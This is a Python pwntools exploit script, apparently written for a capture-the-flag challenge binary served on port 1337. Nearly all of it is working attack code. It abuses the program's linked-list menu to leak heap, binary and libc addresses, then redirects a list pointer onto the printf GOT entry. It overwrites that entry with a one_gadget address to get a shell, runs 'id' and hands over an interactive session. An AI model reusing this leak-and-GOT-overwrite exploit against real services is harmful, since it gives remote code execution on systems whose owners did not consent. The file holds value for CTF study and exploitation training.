#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

def send_command(command_id):
	io.recvuntil(":/>")
	io.sendline("%d"%command_id)

def print_next(to_print):
	send_command(0)
	io.recvuntil("To Print:/>")
	io.sendline("%d"%to_print)

	io.recvuntil("next=")
	return io.recvline().decode("utf-8").strip()
def print_prev(to_print):
	send_command(1)
	io.recvuntil("To Print:/>")
	io.sendline("%d"%to_print)

	io.recvuntil("prev=")
	return io.recvline().decode("utf-8").strip()
def print_value(to_print):
	send_command(2)
	io.recvuntil("To Print:/>")
	io.sendline("%d"%to_print)
	io.recvline()
	return io.recvline().decode("utf-8").strip()
def change_value(to_change,value):
	send_command(3)
	io.recvuntil("ToChange:/>")
	io.sendline("%d"%to_change)
	io.recvuntil("Value:/>")
	io.sendline("0x%x"%value)

def change_next(to_change,value):
	send_command(4)
	io.recvuntil("ToChange:/>")
	io.sendline("%d"%to_change)
	io.recvuntil("Value:/>")
	io.sendline("0x%x"%value)


def change_prev(to_change,value):
	send_command(5)
	io.recvuntil("ToChange:/>")
	io.sendline("%d"%to_change)
	io.recvuntil("Value:/>")
	io.sendline("0x%x"%value)

def new_lnk(value):
	send_command(6)
	io.recvuntil("Value:/>")
	io.sendline("0x%x"%value)



new_lnk(0)
next_addr = int(print_next(0),16)
print("Next_addr heap %x"%next_addr)
first_addr = int(print_prev(1),16)
print("Prev_addr binary %x"%first_addr)
exe.address=first_addr-exe.symbols['first']
print("Exe addr = %x " % exe.address)
change_next(0,first_addr+16) # we set the next elmenet to first.next


#input("Waiting")
# We are changing the value of first.next to got.printf
change_value(1,exe.symbols['got.printf'])
printf_addr = int(print_value(1),16)

print("printf addr = %x"%printf_addr)



libc = ELF('libc6_2.31-0ubuntu9.1_amd64.so') # ENDR DENNE
libc.address= printf_addr-libc.symbols['printf']


## INSERT ONE_GADGET HER 
change_value(1,0xe6c84+libc.address)

input("Execute?:/>")


send_command(2)
io.sendline("%d" % 0)
io.sendline("id")

io.interactive()

